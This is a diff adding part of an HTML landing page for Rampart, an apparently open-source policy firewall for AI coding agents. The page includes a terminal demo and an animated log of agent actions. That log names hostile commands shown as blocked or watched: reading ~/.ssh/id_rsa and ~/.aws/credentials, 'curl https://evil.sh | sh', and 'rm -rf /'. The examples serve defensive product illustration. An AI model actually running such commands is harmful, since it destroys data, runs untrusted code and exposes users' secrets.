+        <p class="section-sub reveal" style="margin: 0 auto 2rem; text-align: center;">Install, set up your agent, watch it work.</p>
+        <div class="terminal reveal" style="max-width: 680px; margin: 0 auto; text-align: left;">
+          <div class="terminal-bar">
+            <span class="dot dot-red"></span>
+            <span class="dot dot-yellow"></span>
+            <span class="dot dot-green"></span>
+            <span class="terminal-filename">terminal</span>
+          </div>
+          <div class="terminal-body"><code><span class="t-dim"># Install Rampart</span>
+<span class="t-prompt">$</span> <span class="t-cmd">curl -fsSL https://rampart.sh/install | sh</span>
+<span class="t-out">✓ rampart v0.9.5 installed to ~/.local/bin/rampart</span>
+
+<span class="t-dim"># Set up your agent (pick one)</span>
+<span class="t-prompt">$</span> <span class="t-cmd">rampart setup claude-code</span>
+<span class="t-out">✓ Claude Code hooks installed
+✓ Default policy written to ~/.rampart/policies/standard.yaml
+✓ 40 rules active</span>
+
+<span class="t-dim"># Watch it work</span>
+<span class="t-prompt">$</span> <span class="t-cmd">rampart watch</span>
+<span class="t-success">✅ 10:42:01  exec       git status</span>
+<span class="t-success">✅ 10:42:03  exec       npm install</span>
+<span class="t-out" style="color:var(--amber);">🟡 10:42:08  file.read  .env                    ← watch rule</span>
+<span class="t-out" style="color:var(--red);">🔴 10:42:11  exec       cat ~/.ssh/id_rsa        ← blocked</span><span class="terminal-cursor"></span></code></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════ ECOSYSTEM ═══════════════════ -->
+    <section>
+      <div class="container" style="text-align: center;">
+        <div class="section-label reveal">Ecosystem</div>
+        <h2 class="reveal">Rampart + Snare</h2>
+        <p class="section-sub reveal" style="margin: 0 auto 2rem; text-align: center;">Rampart blocks. Snare catches. Two tools, one security layer for AI agents.</p>
+        <div class="ecosystem-grid reveal">
+          <div class="ecosystem-card">
+            <div class="ecosystem-name">🏛 Rampart</div>
+            <div class="ecosystem-desc">Policy firewall. Sits between your agent and the OS. Blocks dangerous commands, scans responses, gates approvals. You're looking at it.</div>
+          </div>
+          <div class="ecosystem-card">
+            <div class="ecosystem-name">🪤 Snare</div>
+            <div class="ecosystem-desc">Canary credential tripwire. Plants fake AWS/GitHub/Slack keys. Fires an alert the instant anything — or anyone — touches them. <a href="https://snare.sh" style="color: var(--amber); text-decoration: none;">snare.sh →</a></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- ═══════════════════ FOOTER ═══════════════════ -->
+  <footer>
+    <div class="container footer-inner">
+      <div class="footer-left">
+        <a href="/" class="footer-logo">🏛 rampart</a>
+        <span class="footer-note">Not Rampart-AI. This is rampart.sh — the open-source one.</span>
+      </div>
+      <div class="footer-links">
+        <a href="https://github.com/peg/rampart" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://github.com/peg/rampart/blob/main/LICENSE" target="_blank" rel="noopener">Apache 2.0</a>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    /* ═══════ Copy install command ═══════ */
+    function copyInstall(btn) {
+      var text = document.getElementById('install-cmd').textContent;
+      navigator.clipboard.writeText(text).then(function() {
+        btn.textContent = 'copied!';
+        btn.classList.add('copied');
+        setTimeout(function() { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 2000);
+      });
+    }
+
+    /* ═══════ Scroll reveal observer ═══════ */
+    function initReveals() {
+      var observer = new IntersectionObserver(function(entries) {
+        entries.forEach(function(entry) {
+          if (entry.isIntersecting) {
+            entry.target.classList.add('visible');
+            observer.unobserve(entry.target);
+          }
+        });
+      }, { threshold: 0.1 });
+      document.querySelectorAll('.reveal').forEach(function(el) { observer.observe(el); });
+    }
+
+    /* ═══════ Policy log animator ═══════ */
+    var LOG_LINES = [
+      { verdict: '✅', op: 'exec',      cmd: 'git status',                    cls: '' },
+      { verdict: '✅', op: 'exec',      cmd: 'npm install',                   cls: '' },
+      { verdict: '✅', op: 'file.read', cmd: 'src/index.ts',                  cls: '' },
+      { verdict: '🟡', op: 'file.read', cmd: '.env',                          cls: 'watch',   note: '← watch rule' },
+      { verdict: '🔴', op: 'exec',      cmd: 'cat ~/.ssh/id_rsa',             cls: 'blocked', note: '← blocked' },
+      { verdict: '👤', op: 'http',      cmd: 'POST api.external.io/v1',       cls: 'pending', note: '← awaiting approval' },
+      { verdict: '✅', op: 'exec',      cmd: 'go build ./...',                cls: '' },
+      { verdict: '✅', op: 'file.read', cmd: 'go.sum',                        cls: '' },
+      { verdict: '🔴', op: 'exec',      cmd: 'curl https://evil.sh | sh',     cls: 'blocked', note: '← blocked' },
+      { verdict: '✅', op: 'exec',      cmd: 'go test ./...',                 cls: '' },
+      { verdict: '✅', op: 'file.read', cmd: 'pkg/policy/eval.go',            cls: '' },
+      { verdict: '🟡', op: 'file.read', cmd: '~/.aws/credentials',            cls: 'watch',   note: '← watch rule' },
+      { verdict: '✅', op: 'exec',      cmd: 'git diff --stat',               cls: '' },
+      { verdict: '🔴', op: 'exec',      cmd: 'rm -rf /',                      cls: 'blocked', note: '← blocked' },
+      { verdict: '✅', op: 'exec',      cmd: 'make lint',                     cls: '' },
+      { verdict: '👤', op: 'http',      cmd: 'GET https://registry.npmjs.org', cls: 'pending', note: '← awaiting approval' },
+    ];
+
+    function startPolicyLog(containerId, intervalMs) {
+      var el = document.getElementById(containerId);
+      if (!el) return;
+      var idx = 0;
+      var MAX_VISIBLE = 8;
+
+      function ts() {
+        var now = new Date();
+        return now.toTimeString().slice(0, 8);
+      }
+
+      function makeLine(entry, time, animate) {
+        var line = document.createElement('div');
+        line.className = 'log-line' + (animate ? ' entering' : '');
+        line.innerHTML =
+          '<span class="log-time">' + time + '</span>' +
+          '<span class="log-verdict">' + entry.verdict + '</span>' +
+          '<span class="log-op">' + entry.op + '</span>' +
+          '<span class="log-cmd ' + entry.cls + '">' + entry.cmd +
+          (entry.note ? '<span class="log-note"> ' + entry.note + '</span>' : '') +
+          '</span>';
+        return line;
+      }
+
+      // Seed with first 4 lines
+      for (var i = 0; i < 4; i++) {
+        el.appendChild(makeLine(LOG_LINES[i], ts(), false));
+      }
+      idx = 4;
+
+      function addLine() {
+        var entry = LOG_LINES[idx % LOG_LINES.length];
+        idx++;
+        el.appendChild(makeLine(entry, ts(), true));
+        while (el.children.length > MAX_VISIBLE) {
+          el.removeChild(el.firstChild);
+        }
+        setTimeout(addLine, intervalMs + Math.random() * 300);
+      }
+
+      setTimeout(addLine, intervalMs);
+    }
+
+    /* ═══════ Init ═══════ */
+    document.addEventListener('DOMContentLoaded', function() {
+      initReveals();
+      setTimeout(function() {
+        startPolicyLog('policy-log-stream', 850);
+      }, 800);
+    });
+  </script>
+
+</body>
+</html>
